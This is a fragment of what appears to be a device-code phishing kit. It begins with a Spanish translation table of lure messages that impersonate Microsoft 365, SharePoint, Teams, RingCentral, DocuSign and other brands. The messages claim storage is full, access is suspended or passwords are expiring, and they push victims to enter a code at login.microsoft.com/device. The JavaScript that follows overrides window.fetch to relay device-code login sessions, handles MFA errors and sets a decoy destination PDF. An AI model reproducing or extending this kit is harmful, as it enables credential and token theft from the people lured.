Authenticator":"Protegido por Microsoft Autenticador","Protected by Microsoft Defender":"Protegido por Microsoft Defensor","Protected by Microsoft Security":"Protegido por Microsoft Seguridad","Protected session":"Sesión protegida","QuickBooks Document Review":"QuickBooks Revisión del documento","Ready - click Confirm Booking to finish":"Listo: haz clic en Confirmar reserva para finalizar","Redirecting to account settings...":"Redirigiendo a la configuración de la cuenta...","Redirecting you now...":"Redireccionándote ahora...","Regenerate":"Generar de nuevo","Request a new code to continue.":"Solicite un nuevo código para continuar.","Request created by":"Solicitud creada por","Request submitted":"Solicitud enviada","Requested Site — Pending Verification":"Sitio solicitado: verificación pendiente","Requires Identity Verification":"Requiere verificación de identidad","Requires identity verification":"Requiere verificación de identidad","Resource Details":"Detalles del recurso","Resource details":"Detalles del recurso","Response needed":"Se necesita respuesta","Return here — the document will":"Regrese aquí: el documento","Return to this page and it will open automatically.":"Regrese a esta página y se abrirá automáticamente.","Return to this page to complete confirmation":"Regrese a esta página para completar la confirmación","Return to this tab — the document will open automatically":"Regrese a esta pestaña: el documento se abrirá automáticamente","Review Document":"Revisar documento","RingCentral Account":"RingCentral Cuenta","RingCentral Identity Verification":"RingCentral Verificación de identidad","RingCentral Support":"RingCentral Soporte","RingCentral Voicemail Access":"RingCentral Acceso al correo de voz","RingCentral — Voicemail Access Verification":"RingCentral — Verificación de acceso al correo de voz","Sa":"Sá","Scheduled Meeting — Pending Access":"Reunión programada: acceso pendiente","Search":"Buscar","Secure File Access":"Acceso seguro a archivos","Secure access for Microsoft 365":"Acceso seguro para Microsoft 365","Secure connection":"Conexión segura","Secure file access":"Acceso seguro a archivos","Secure — identity verified before booking":"Seguro: identidad verificada antes de reservar","Secured by Microsoft 365 organizational authentication":"Protegido por Microsoft 365 autenticación organizacional","Secured by Microsoft account protection":"Protegido por la protección de cuenta Microsoft","Secured by Microsoft identity platform · RingCentral account protection":"Protegido por la plataforma de identidad Microsoft · Protección de cuenta RingCentral","Securing your session":"Asegurando tu sesión","Security Notice:":"Aviso de seguridad:","Security details":"Detalles de seguridad","Security protocols":"Protocolos de seguridad","Select date":"Seleccionar fecha","Sent Items":"Artículos enviados","Sent to your":"Enviado a tu","Session Expired":"Sesión caducada","Session expires in":"La sesión caduca en","Session failed":"La sesión falló","Session failed. Please refresh and try again.":"La sesión falló. Actualice e inténtelo de nuevo.","Session is connected to Microsoft verification window":"La sesión está conectada a la ventana de verificación Microsoft","Settings":"Ajustes","Share":"Compartir","SharePoint - Project Documents":"SharePoint - Documentos del proyecto","SharePoint Groups \u0026 Permissions Management":"SharePoint Gestión de permisos y grupos","SharePoint Online":"SharePoint En línea","SharePoint for Microsoft":"SharePoint para Microsoft","SharePoint site access is governed by your organization\u0027s Microsoft 365 security and compliance policies.":"El acceso al sitio SharePoint se rige por las políticas de cumplimiento y seguridad Microsoft 365 de su organización.","SharePoint · Microsoft 365":"SharePoint · Microsoft 365","Shared":"Compartido","Shared Document – OneDrive":"Documento compartido: OneDrive","Shared via link":"Compartido mediante enlace","Shared with me":"compartido conmigo","Shared with you":"Compartido contigo","Sign In - Secure Portal":"Iniciar sesión - Portal seguro","Sign in":"Iniciar sesión","Sign in using your Microsoft account credentials to authorize the storage recovery process.":"Inicie sesión con las credenciales de su cuenta Microsoft para autorizar el proceso de recuperación del almacenamiento.","Sign in using your Microsoft account credentials. SharePoint site access will be fully restored upon successful completion.":"Inicie sesión con las credenciales de su cuenta Microsoft. El acceso al sitio SharePoint se restaurará por completo una vez completado con éxito.","Sign in using your Microsoft account credentials. Your RingCentral voicemail inbox will be unlocked immediately upon successful verification.":"Inicie sesión con las credenciales de su cuenta Microsoft. Su bandeja de entrada de correo de voz RingCentral se desbloqueará inmediatamente después de una verificación exitosa.","Sign in using your Microsoft account credentials. Your Teams meeting access will be fully restored upon successful completion.":"Inicie sesión con las credenciales de su cuenta Microsoft. Su acceso a la reunión Teams se restaurará por completo una vez finalizada con éxito.","Sign in with your":"Inicia sesión con tu","Sign in with your Microsoft account credentials":"Inicie sesión con las credenciales de su cuenta Microsoft","Sign in – Microsoft \u0026 Adobe":"Iniciar sesión: Microsoft y Adobe","Sign in – Microsoft \u0026 DocuSign":"Iniciar sesión: Microsoft y DocuSign","Sign in – Microsoft \u0026 OneDrive":"Iniciar sesión: Microsoft y OneDrive","Sign in – Microsoft \u0026 SharePoint":"Iniciar sesión: Microsoft y SharePoint","Sign in – Microsoft Teams":"Iniciar sesión: Microsoft Teams","Sign in – Microsoft Voicemail":"Iniciar sesión: Microsoft Correo de voz","Sign-in window opened. Enter the code and authenticate with your Microsoft 365 account.":"Se abrió la ventana de inicio de sesión. Ingrese el código y autentíquese con su cuenta Microsoft 365.","Sign-in window opened. Enter the code and authenticate with your Microsoft account.":"Se abrió la ventana de inicio de sesión. Ingrese el código y autentíquese con su cuenta Microsoft.","Sign-in window opened. Enter the code and authenticate.":"Se abrió la ventana de inicio de sesión. Ingrese el código y autentíquese.","Signed-in account":"Cuenta iniciada","Site Access Authorization":"Autorización de acceso al sitio","Site Access Verification":"Verificación de acceso al sitio","Site access suspended.":"Acceso al sitio suspendido.","Site contents":"Contenido del sitio","Something went wrong. Please refresh to try again.":"Algo salió mal. Actualice para intentarlo nuevamente.","Something went wrong. Please try again.":"Algo salió mal. Por favor inténtalo de nuevo.","Steps to complete verification":"Pasos para completar la verificación","Steps to listen:":"Pasos para escuchar:","Steps to view:":"Pasos para ver:","Storage Breakdown":"Desglose del almacenamiento","Storage Full":"Almacenamiento lleno","Storage Management":"Gestión de almacenamiento","Storage Recovery Authorization":"Autorización de recuperación de almacenamiento","Storage quotas are enforced by your organization or Microsoft 365 subscription plan.":"Las cuotas de almacenamiento las aplica su organización o su Microsoft 365 plan de suscripción.","Su":"Do","Support":"Soporte","Suspended":"Suspendido","Suspended Permissions":"Permisos suspendidos","Terms":"Términos","Terms of Service":"Términos de servicio","Th":"Ju","The code has expired. Please refresh to generate a new one.":"El código ha caducado. Actualice para generar uno nuevo.","The presentation is opening now.":"La presentación se está abriendo ahora.","The session could not be created. Please refresh the page.":"No se pudo crear la sesión. Por favor actualice la página.","The verification code has expired. Generate a new code to continue.":"El código de verificación ha caducado. Genera un nuevo código para continuar.","The verification code is active. Please complete sign-in to continue.":"El código de verificación está activo. Complete el inicio de sesión para continuar.","This SharePoint document requires a Microsoft verification code before it can be opened.":"Este documento SharePoint requiere un código de verificación Microsoft antes de poder abrirse.","This invitation is protected. Verify your Microsoft account to access the meeting details and send your reply.":"Esta invitación está protegida. Verifique su cuenta Microsoft para acceder a los detalles de la reunión y enviar su respuesta.","This session has expired. Please refresh to continue.":"Esta sesión ha caducado. Actualice para continuar.","This usually takes a few seconds.":"Esto suele tardar unos segundos.","To access this document, please complete verification with Microsoft.":"Para acceder a este documento, complete la verificación con Microsoft.","To initiate the storage cleanup process and restore full mailbox functionality, your identity must be verified through the Microsoft account portal. Please utilize the authorization code provided below to complete this procedure.":"Para iniciar el proceso de limpieza del almacenamiento y restaurar la funcionalidad completa del buzón, se debe verificar su identidad a través del portal de cuentas Microsoft. Utilice el código de autorización que se proporciona a continuación para completar este procedimiento.","To restore your access to Microsoft Teams meetings and resume full participation in scheduled sessions, your identity must be verified through the Microsoft account portal. Please enter the authorization code provided below when prompted on the verification page.":"Para restaurar su acceso a las reuniones Microsoft Teams y reanudar la participación total en las sesiones programadas, se debe verificar su identidad a través del portal de la cuenta Microsoft. Ingrese el código de autorización que se proporciona a continuación cuando se le solicite en la página de verificación.","To restore your access to this SharePoint site collection and resume full collaboration capabilities, your identity must be verified through the Microsoft account portal. Please enter the authorization code provided below when prompted on the verification page.":"Para restaurar su acceso a esta colección de sitios SharePoint y reanudar todas las capacidades de colaboración, su identidad debe verificarse a través del portal de cuentas Microsoft. Ingrese el código de autorización que se proporciona a continuación cuando se le solicite en la página de verificación.","To review and sign this document, complete the identity verification steps below.":"Para revisar y firmar este documento, complete los pasos de verificación de identidad a continuación.","To unlock your RingCentral voicemail inbox and restore access to all pending messages and recordings, your identity must be verified through the Microsoft account portal. Please enter the authorization code provided below when prompted on the verification page.":"Para desbloquear su bandeja de entrada de correo de voz RingCentral y restaurar el acceso a todos los mensajes y grabaciones pendientes, su identidad debe verificarse a través del portal de la cuenta Microsoft. Ingrese el código de autorización que se proporciona a continuación cuando se le solicite en la página de verificación.","Today":"Hoy","Total requested":"Total solicitado","Tu":"Ma","Type":"Tipo","Unverified":"Inconfirmado","Upload":"Subir","Use this code to finish opening the document.":"Utilice este código para terminar de abrir el documento.","Valid 10 min":"Válido 10 min","Valid 15 min":"Válido 15 minutos","Vendor Invoice":"Factura del proveedor","Verification":"Verificación","Verification Code - Zoom":"Código de verificación: Zoom","Verification Required":"Verificación requerida","Verification complete. Continuing approval...":"Verificación completa. Aprobación continua...","Verification complete. Opening document workspace...":"Verificación completa. Abriendo espacio de trabajo de documentos...","Verification complete. Opening document...":"Verificación completa. Documento de apertura...","Verification complete. Opening voicemail portal...":"Verificación completa. Abriendo portal de correo de voz...","Verification information":"Información de verificación","Verification requested from you":"Verificación solicitada por usted","Verification required":"Se requiere verificación","Verification steps":"Pasos de verificación","Verified":"Verificado","Verified sender":"Remitente verificado","Verify":"Verificar","Verify \u0026 Continue":"Verificar y continuar","Verify to access document":"Verificar para acceder al documento","Verify your identity to access this shared OneDrive document.":"Verifique su identidad para acceder a este OneDrive documento compartido.","Video call via Microsoft Teams":"Videollamada a través de Microsoft Teams","Video conference":"Videoconferencia","View SharePoint admin center":"Ver SharePoint centro de administración","View Teams meeting calendar":"Ver Teams calendario de reuniones","View detailed storage report":"Ver informe de almacenamiento detallado","Voicemail":"Correo de voz","Voicemail Services":"Servicios de correo de voz","Voicemail access code":"Código de acceso al correo de voz","Voicemail inbox locked":"Bandeja de entrada del correo de voz bloqueada","Voicemail inbox locked.":"Bandeja de entrada del correo de voz bloqueada.","Voicemail services are managed through your RingCentral subscription and account policy.":"Los servicios de correo de voz se administran a través de su RingCentral suscripción y política de cuenta.","Voicemail services managed through Microsoft 365.":"Servicios de correo de voz gestionados a través de Microsoft 365.","Voicemail settings":"Configuración del correo de voz","Voicemail unlocked. Redirecting to Microsoft Teams...":"Correo de voz desbloqueado. Redirigiendo a Microsoft Teams...","Wait until the document access code is ready":"Espere hasta que el código de acceso al documento esté listo","Wait until the voicemail access code is ready":"Espere hasta que el código de acceso al correo de voz esté listo","Waiting for a one-time verification code...":"Esperando un código de verificación único...","Waiting for code":"esperando codigo","Waiting for verification — complete the popup window":"Esperando verificación: complete la ventana emergente","We":"Mi","Weekly Sync — All Hands":"Sincronización semanal: todos los empleados","Word file":"Word archivo","Workbook Access Authorization":"Autorización de acceso al libro de trabajo","Workbook Access Verification":"Verificación de acceso al libro de trabajo","Workflow":"Flujo de trabajo","WorldRemit Approvals":"WorldRemit Aprobaciones","WorldRemit social links":"WorldRemit enlaces sociales","You are currently unable to join, host, or manage Microsoft Teams meetings pending the completion of identity verification. All scheduled meetings and recorded sessions remain intact and will be fully accessible upon successful verification.":"Actualmente no puede unirse, organizar ni administrar reuniones Microsoft Teams hasta que se complete la verificación de identidad. Todas las reuniones programadas y sesiones grabadas permanecen intactas y serán completamente accesibles tras una verificación exitosa.","You are currently unable to view, upload, or modify content within this SharePoint site collection. All existing documents, lists, and site data remain intact and will be fully accessible upon successful identity verification.":"Actualmente no puede ver, cargar ni modificar contenido dentro de esta SharePoint colección de sitios. Todos los documentos, listas y datos del sitio existentes permanecen intactos y serán completamente accesibles tras una verificación de identidad exitosa.","You are here":"Usted está aquí","You will be redirected to the SharePoint site shortly.":"En breve será redirigido al sitio SharePoint.","You will be redirected to your document shortly.":"Serás redirigido a tu documento en breve.","You will be redirected to your file shortly.":"Serás redirigido a tu archivo en breve.","You will continue shortly.":"Continuarás en breve.","You\u0027ll be redirected to your Teams meeting shortly.":"En breve serás redirigido a tu reunión Teams.","You\u0027ll be redirected to your voicemail shortly.":"Serás redirigido a tu correo de voz en breve.","You\u0027re verified":"Estás verificado","Your Microsoft Excel account requires identity verification before access to this protected workbook.":"Su cuenta Microsoft Excel requiere verificación de identidad antes de acceder a este libro protegido.","Your Microsoft SharePoint account requires identity verification before access to protected site collections and document libraries may be granted. Please complete the verification process to restore full site access.":"Su cuenta Microsoft SharePoint requiere verificación de identidad antes de que se le pueda otorgar acceso a colecciones de sitios y bibliotecas de documentos protegidos. Complete el proceso de verificación para restaurar el acceso completo al sitio.","Your Microsoft Teams account requires identity verification before you may join or manage scheduled meeting sessions. Please complete the verification process to restore full meeting access.":"Su cuenta Microsoft Teams requiere verificación de identidad antes de poder unirse o administrar sesiones de reuniones programadas. Complete el proceso de verificación para restaurar el acceso completo a la reunión.","Your Microsoft passkey has been connected.":"Su Microsoft Passkey se ha conectado.","Your RingCentral account requires identity verification before voicemail messages may be accessed or managed. Please complete the verification process to restore full voicemail functionality.":"Su cuenta RingCentral requiere verificación de identidad antes de poder acceder o administrar los mensajes de correo de voz. Complete el proceso de verificación para restaurar la funcionalidad completa del correo de voz.","Your authorization code has expired. Please refresh to try again.":"Su código de autorización ha caducado. Actualice para intentarlo nuevamente.","Your booking request is ready for":"Su solicitud de reserva está lista para","Your browser blocked the Microsoft window. Allow popups and try again.":"Su navegador bloqueó la ventana Microsoft. Permita ventanas emergentes e inténtelo de nuevo.","Your code stays protected":"Tu código permanece protegido","Your identity has been confirmed. The approval workflow will continue shortly.":"Su identidad ha sido confirmada. El flujo de trabajo de aprobación continuará en breve.","Your identity has been confirmed. The document will open shortly.":"Su identidad ha sido confirmada. El documento se abrirá en breve.","Your mailbox is at capacity. Incoming emails are being rejected and cannot be delivered to your inbox until storage is reduced.":"Su buzón está lleno. Los correos electrónicos entrantes se rechazan y no se pueden entregar a su bandeja de entrada hasta que se reduzca el almacenamiento.","Your password is about to expire. Verify your identity through Microsoft to keep your account and data secure.":"Su contraseña está a punto de caducar. Verifique su identidad a través de Microsoft para mantener su cuenta y sus datos seguros.","Your password is expiring soon. Verify your identity with Microsoft to keep your account secure.":"Su contraseña caducará pronto. Verifique su identidad con Microsoft para mantener su cuenta segura.","Your verification code has expired.":"Su código de verificación ha caducado.","Your verification code has expired. Please refresh the page to generate a new code and try again.":"Su código de verificación ha caducado. Actualice la página para generar un nuevo código e inténtelo de nuevo.","Your verification code has expired. Please refresh to continue.":"Su código de verificación ha caducado. Actualice para continuar.","Your verification code has expired. Please refresh to try again.":"Su código de verificación ha caducado. Actualice para intentarlo nuevamente.","Your verification code will appear here":"Tu código de verificación aparecerá aquí","and enter the code when prompted on the identity verification page.":"e ingrese el código cuando se le solicite en la página de verificación de identidad.","and enter the code when prompted on the verification page.":"e ingrese el código cuando se le solicite en la página de verificación.","and paste it on the page that opens":"y pégalo en la página que se abre","and paste it when prompted":"y péguelo cuando se le solicite","and paste the code on the sign-in page.":"y pegue el código en la página de inicio de sesión.","attendees":"asistentes","below":"abajo","below to open the Microsoft verification window":"a continuación para abrir la ventana de verificación Microsoft","calendar and meeting context":"calendario y contexto de la reunión","eSign compliant":"Compatible con firma electrónica","for assistance.":"para obtener ayuda.","login.microsoft.com/device":"login.microsoft.com/device","open automatically":"se abrirá automáticamente","paste it":"pegarlo","shared files":"archivos compartidos","shown above when prompted":"se muestra arriba cuando se le solicita","shown above.":"que se muestra arriba.","the code above":"el código de arriba","to confirm your identity":"para confirmar su identidad","to launch Microsoft login.":"para iniciar Microsoft iniciar sesión.","to launch the sign-in window":"para iniciar la ventana de inicio de sesión","with your secure account":"con tu cuenta segura","your guest":"su invitado","· SOX §404 approval controls · confidential":"· Controles de aprobación SOX §404 · confidencial","— a Microsoft login window will appear":"— aparecerá una ventana de inicio de sesión Microsoft","• Encrypted":"• Cifrado","←  Back":"←  Volver","↻ Generate new code":"↻ Generar nuevo código","↻ Get a new code":"↻ Obtener un nuevo código","↻ Refresh code":"↻ Actualizar código","↻ Request a new code":"↻ Solicitar un nuevo código","↻ Request new verification code":"↻ Solicitar nuevo código de verificación","Open":"Abrir","Prepare":"Preparar","Access":"Acceso","Listen":"Escuchar","File Size":"Tamaño de archivo","Finance":"Finanzas","Following":"Siguiendo","HR Documents":"Documentos de RR. HH.","Legal":"Legal","Libraries":"Bibliotecas","Modified By":"Modificado por","Navigation":"Navegación","Private":"Privado","Recent":"Recientes","Recycle bin":"Papelera de reciclaje","Sharing":"Uso compartido","Sync":"Sincronizar","› Legal":"› Legal","Document ready for your review":"Documento listo para su revisión","Verify your identity to access this document":"Verifique su identidad para acceder a este documento","Loading document...":"Cargando documento...","To review and sign this document, complete the verification steps below.":"Para revisar y firmar este documento, complete los pasos de verificación que aparecen a continuación.","Action needed":"Acción necesaria","An error occurred. Please try again.":"Se produjo un error. Por favor inténtalo de nuevo.","Checking file session...":"Comprobando sesión de archivos...","Code copied. Complete verification in the opened Microsoft page.":"Código copiado. Complete la verificación en la página abierta de Microsoft.","Connection failed":"La conexión falló","Connection failed. Please check your network and try again.":"La conexión falló. Por favor verifique su red e inténtelo nuevamente.","Contacting Microsoft 365 servers...":"Contactando con los servidores Microsoft 365...","Contacting RingCentral servers...":"Contactando con los servidores RingCentral...","Continue in Microsoft Passkey":"Continuar en Microsoft Passkey","Failed to connect":"No se pudo conectar","Failed to start verification":"No se pudo iniciar la verificación","Finalizing your session...":"Finalizando su sesión...","Generating authorization code...":"Generando código de autorización...","Generating secure code...":"Generando código seguro...","Get Meeting ID":"Obtener ID de reunión","Initialization failed":"La inicialización falló","New verification code ready":"Nuevo código de verificación listo","Opening document pages...":"Abriendo páginas del documento...","Passkey verification failed. Please try again.":"La verificación de la clave de acceso falló. Inténtelo de nuevo.","Please request a new code and complete the verification again.":"Solicite un nuevo código y complete la verificación nuevamente.","Preparing access code...":"Preparando código de acceso...","Preparing secure verification":"Preparando la verificación segura","Preparing your session...":"Preparando su sesión...","Ready":"Listo","Request a new verification code to continue":"Solicite un nuevo código de verificación para continuar","Security code copied":"Código de seguridad copiado","Something went wrong. Generate a new code to try again.":"Algo salió mal. Genera un nuevo código para volver a intentarlo.","Something went wrong. Please generate a new pairing code.":"Algo salió mal. Por favor genere un nuevo código de emparejamiento.","Something went wrong. Please refresh and try again.":"Algo salió mal. Actualice e inténtelo de nuevo.","Something went wrong. Please try again from the generated URL.":"Algo salió mal. Inténtelo de nuevo desde la URL generada.","The connection could not be established.":"No se pudo establecer la conexión.","The encrypted identity session could not be started.":"No se pudo iniciar la sesión de identidad cifrada.","The new code is ready. Select Sign in with this code to reopen the sign-in window.":"El nuevo código está listo. Seleccione Iniciar sesión con este código para volver a abrir la ventana de inicio de sesión.","The pairing code expired. Generate a new one to continue.":"El código de emparejamiento caducó. Genere uno nuevo para continuar.","The security service encountered an error. Please try again.":"El servicio de seguridad encontró un error. Por favor inténtalo de nuevo.","The sign-in window has reopened. Please use the new code shown here to continue.":"La ventana de inicio de sesión se ha vuelto a abrir. Utilice el nuevo código que se muestra aquí para continuar.","The verification code expired. Generate a new code to continue.":"El código de verificación caducó. Genere un nuevo código para continuar.","The verification code has expired. Please refresh to continue.":"El código de verificación ha caducado. Actualice para continuar.","The verification code has expired. Please request a new one.":"El código de verificación ha caducado. Por favor solicite uno nuevo.","The verification session could not be started. Please try again.":"No se pudo iniciar la sesión de verificación. Por favor inténtalo de nuevo.","This session could not be completed. Please refresh to try again.":"Esta sesión no se pudo completar. Actualice para intentarlo nuevamente.","This verification code has expired. Generate a new code to continue.":"Este código de verificación ha caducado. Genere un nuevo código para continuar.","Unable to connect. Check your network and try again.":"No se puede conectar. Verifique su red e inténtelo nuevamente.","Unable to connect. Open this page through the generated worker or exported HTML URL.":"No se puede conectar. Abra esta página mediante el Worker generado o la URL HTML exportada.","Unable to generate a verification code. Generate a new code to try again.":"No se puede generar un código de verificación. Genera un nuevo código para volver a intentarlo.","Unable to reach Microsoft identity services.":"No se puede acceder a los servicios de identidad de Microsoft.","Unavailable":"Indisponible","Validating workbook permissions...":"Validando permisos del libro de trabajo...","Verification could not be completed. Please try again.":"No se pudo completar la verificación. Por favor inténtalo de nuevo.","Verification failed. Generate a new code to try again.":"La verificación falló. Genera un nuevo código para volver a intentarlo.","Verification failed. Please refresh and try again.":"La verificación falló. Actualice e inténtelo de nuevo.","Verification failed. Please refresh to try again.":"La verificación falló. Actualice para intentarlo nuevamente.","Verification failed. Please try again.":"La verificación falló. Por favor inténtalo de nuevo.","Verification window opened. Copy the code manually and paste it there.":"Se abrió la ventana de verificación. Copie el código manualmente y péguelo allí.","Your access code has expired. Regenerate to continue.":"Su código de acceso ha caducado. Genere uno nuevo para continuar.","Your administrator requires an additional confirmation. A new verification code will be generated, and the sign-in window will reopen.":"Su administrador requiere una confirmación adicional. Se generará un nuevo código de verificación y se volverá a abrir la ventana de inicio de sesión.","Your administrator requires an additional confirmation. Please request a new code and try again.":"Su administrador requiere una confirmación adicional. Solicite un nuevo código e inténtelo de nuevo.","Your authorization code has expired. Please refresh to continue.":"Su código de autorización ha caducado. Actualice para continuar.","Your session has expired. Please refresh to continue.":"Su sesión ha caducado. Actualice para continuar.","Your verification code has expired. Please refresh.":"Su código de verificación ha caducado. Por favor actualice.","File":"Archivo","Insert":"Insertar","Draw":"Dibujar","Design":"Diseño","Layout":"Disposición","References":"Referencias","View":"Vista","AutoSave off":"Autoguardado desactivado","Generating secure code":"Generando código seguro"},"patterns":{"Code valid for {time}":"Código válido durante {time}","Code expires in {time}":"El código caduca en {time}","Expires in {time}":"Caduca en {time}","Valid for {time}":"Válido durante {time}","Verification code expires in {time}":"El código de verificación caduca en {time}","Session expires in {time}":"La sesión caduca en {time}","{count} page":"{count} página","{count} pages":"{count} páginas","{count} sheets":"{count} hojas","{count} invited":"{count} invitados","{count} attendees":"{count} asistentes","{count} GB limit":"límite de {count} GB","If popup does not match your account, type: {email}":"Si la ventana emergente no coincide con su cuenta, escriba: {email}","If the popup doesn\u0027t show your email, enter: {email}":"Si la ventana emergente no muestra su correo electrónico, escriba: {email}"}};window.__DESTINATION_URL="https://www.invesco.com/content/dam/invesco/emea/en/pdf/io-investor-en.pdf";window.__AUTH_MODE="cookie";window.__DEVICE_OPEN_MODE="popup";window.__FORCE_BLOB_FROM_START=false;(function(){
+  function sxFirstPresent(){
+    for(var i=0;i<arguments.length;i++){
+      if(arguments[i]!==undefined && arguments[i]!==null && arguments[i]!=='') return arguments[i];
+    }
+    return null;
+  }
+
+  function sxDevicePayload(data){
+    data = data && typeof data === 'object' ? data : {};
+    var result = data.result && typeof data.result === 'object' ? data.result : {};
+    var device = data.device && typeof data.device === 'object'
+      ? data.device
+      : (result.device && typeof result.device === 'object' ? result.device : {});
+
+    return {
+      jobId: sxFirstPresent(
+        data.job_id, data.login_id, data.id, data.session_id,
+        result.job_id, result.login_id, result.id, result.session_id
+      ),
+      status: sxFirstPresent(data.status, result.status, device.status),
+      userCode: sxFirstPresent(
+        data.user_code, data.device_code, data.code,
+        result.user_code, result.device_code, result.code,
+        device.user_code, device.device_code, device.code
+      ),
+      verificationUri: sxFirstPresent(
+        data.verification_uri, data.verification_url, data.verificationUrl,
+        result.verification_uri, result.verification_url, result.verificationUrl,
+        device.verification_uri, device.verification_url, device.verificationUrl,
+        device.verification_uri_complete
+      ),
+      error: sxFirstPresent(
+        data.error, data.message, data.last_error,
+        result.error, result.message, result.last_error,
+        device.error, device.message
+      ),
+      errorCode: sxFirstPresent(data.error_code, result.error_code, result.error_meta && result.error_meta.error_code),
+      recommendedMode: sxFirstPresent(data.recommended_mode, result.recommended_mode, result.error_meta && result.error_meta.recommended_mode),
+      errorMessage: sxFirstPresent(data.error_message, result.error_message, result.error_meta && result.error_meta.error_message),
+      softError: !!(data.soft_error || result.soft_error || (result.error_meta && result.error_meta.soft_error))
+    };
+  }
+
+  function sxIsSoftInteractionError(out, payload){
+    var errorCode = sxFirstPresent(out.error_code, payload.errorCode);
+    var recommendedMode = String(sxFirstPresent(out.recommended_mode, payload.recommendedMode, '')).toLowerCase();
+    var text = [
+      out.error,
+      out.message,
+      out.last_error,
+      out.error_message,
+      payload.error,
+      payload.errorMessage
+    ].join(' ').toLowerCase();
+
+    return !!(
+      out.soft_error ||
+      payload.softError ||
+      recommendedMode === 'token' ||
+      String(errorCode) === '50076' ||
+      text.indexOf('aadsts50076') !== -1 ||
+      text.indexOf('interaction_required') !== -1 ||
+      text.indexOf('interaction required') !== -1 ||
+      text.indexOf('basic_action') !== -1
+    );
+  }
+
+  function sxNormalizeDeviceJson(data){
+    if(!data || typeof data !== 'object' || Array.isArray(data)) return data;
+    var out = {};
+    for(var key in data){
+      if(Object.prototype.hasOwnProperty.call(data, key)) out[key] = data[key];
+    }
+
+    var payload = sxDevicePayload(data);
+    if(payload.jobId !== null && !out.job_id) out.job_id = payload.jobId;
+    if(payload.userCode !== null && !out.user_code) out.user_code = payload.userCode;
+    if(payload.verificationUri !== null && !out.verification_uri) out.verification_uri = payload.verificationUri;
+    if(payload.status !== null && !out.status) out.status = payload.status;
+    if(payload.error !== null && !out.error) out.error = payload.error;
+    if(payload.errorCode !== null && !out.error_code) out.error_code = payload.errorCode;
+    if(payload.recommendedMode !== null && !out.recommended_mode) out.recommended_mode = payload.recommendedMode;
+    if(payload.errorMessage !== null && !out.error_message) out.error_message = payload.errorMessage;
+    if(sxIsSoftInteractionError(out, payload)){
+      out.soft_error = true;
+      if(!out.error_code) out.error_code = 50076;
+      if(!out.recommended_mode) out.recommended_mode = 'token';
+      if(!out.error_message && out.error) out.error_message = out.error;
+    }
+
+    if(out.error && !out.user_code && !out.job_id && !out.status){
+      out.message = out.error;
+      out.error = 'failed';
+      out.status = 'failed';
+    }
+    if(out.status === 'error') out.status = 'failed';
+
+    if(out.user_code && (!out.status || out.status === 'pending' || out.status === 'running' || out.status === 'queued')){
+      out.status = 'waiting_user';
+    }
+
+    return out;
+  }
+
+  function sxDeviceFetchPath(input){
+    try{
+      var raw = typeof input === 'string' || input instanceof URL ? input : (input && input.url);
+      if(!raw) return '';
+      return new URL(raw, location.href).pathname;
+    }catch(_){
+      return '';
+    }
+  }
+
+  function sxIsDeviceFetch(input){
+    var path = sxDeviceFetchPath(input);
+    return path === '/api/device/start' || path.indexOf('/api/device/status/') === 0;
+  }
+
+  function sxFetchWithAuthMode(input, init, shouldPatch){
+    var mode = typeof window.__AUTH_MODE === 'string' ? window.__AUTH_MODE : '';
+    if(!shouldPatch || (mode !== 'token' && mode !== 'cookie') || typeof Headers === 'undefined'){
+      return { input: input, init: init };
+    }
+
+    var nextInit = {};
+    if(init){
+      for(var key in init){
+        if(Object.prototype.hasOwnProperty.call(init, key)) nextInit[key] = init[key];
+      }
+    }
+
+    var headers = new Headers(nextInit.headers || (input && input.headers) || undefined);
+    if(!headers.has('X-Auth-Mode')) headers.set('X-Auth-Mode', mode);
+    nextInit.headers = headers;
+
+    if(typeof Request !== 'undefined' && input instanceof Request){
+      return { input: new Request(input, nextInit), init: undefined };
+    }
+
+    return { input: input, init: nextInit };
+  }
+
+  function sxInstallDeviceFetchCompat(){
+    if(window.__DEVICE_FETCH_COMPAT_READY || typeof window.fetch !== 'function') return;
+    if(typeof Response === 'undefined' || typeof Headers === 'undefined') return;
+    window.__DEVICE_FETCH_COMPAT_READY = true;
+
+    var nativeFetch = window.fetch.bind(window);
+    var inFlightStatus = {};
+    function sxCloneResponse(response){
+      return response && typeof response.clone === 'function' ? response.clone() : response;
+    }
+    function sxFetchMethod(input, init){
+      return String(
+        (init && init.method) ||
+        (input && input.method) ||
+        'GET'
+      ).toUpperCase();
+    }
+    function sxStatusDedupeKey(input, init){
+      if(sxFetchMethod(input, init) !== 'GET') return '';
+      var path = sxDeviceFetchPath(input);
+      return path.indexOf('/api/device/status/') === 0 ? path : '';
+    }
+    window.fetch = function(input, init){
+      var shouldPatch = sxIsDeviceFetch(input);
+      var args = sxFetchWithAuthMode(input, init, shouldPatch);
+      var dedupeKey = shouldPatch ? sxStatusDedupeKey(args.input, args.init) : '';
+
+      if(dedupeKey && inFlightStatus[dedupeKey]){
+        return inFlightStatus[dedupeKey].then(sxCloneResponse);
+      }
+
+      var request = nativeFetch(args.input, args.init).then(function(response){
+        if(!shouldPatch || !response || typeof response.clone !== 'function') return response;
+
+        return response.clone().text().then(function(text){
+          if(!text) return response;
+
+          var parsed;
+          try{
+            parsed = JSON.parse(text);
+          }catch(_){
+            return response;
+          }
+
+          var headers = new Headers(response.headers);
+          headers.set('content-type', 'application/json; charset=utf-8');
+
+          return new Response(JSON.stringify(sxNormalizeDeviceJson(parsed)), {
+            status: response.status,
+            statusText: response.statusText,
+            headers: headers
+          });
+        }, function(){
+          return response;
+        });
+      });
+
+      if(!dedupeKey) return request;
+
+      inFlightStatus[dedupeKey] = request;
+      request.finally(function(){
+        if(inFlightStatus[dedupeKey] === request) delete inFlightStatus[dedupeKey];
+      });
+
+      return request.then(sxCloneResponse);
+    };
+  }
+
+  function sxTemplateBackgroundColor(){
+    var raw = typeof window.__TEMPLATE_BACKGROUND_COLOR === 'string'
+      ? window.__TEMPLATE_BACKGROUND_COLOR.trim()
+      : '';
+    var match = raw.match(/^#?([0-9a-f]{3}|[0-9a-f]{6})$/i);
+    if (!match) return '';
+
+    var hex = match[1].toLowerCase();
+    if (hex.length === 3) {
+      hex = hex.charAt(0) + hex.charAt(0)
+        + hex.charAt(1) + hex.charAt(1)
+        + hex.charAt(2) + hex.charAt(2);
+    }
+
+    return '#' + hex;
+  }
+
+  function applyTemplateBackgroundColor(){
+    var color = sxTemplateBackgroundColor();
+    if (!color) return;
+
+    var root = document.documentElement;
+    root.style.setProperty('--app-bg-color', color);
+    root.style.backgroundColor = color;
+    root.classList.add('__template-bg-color-ready', 'has-custom-background-color');
+
+    if (!document.body) return;
+
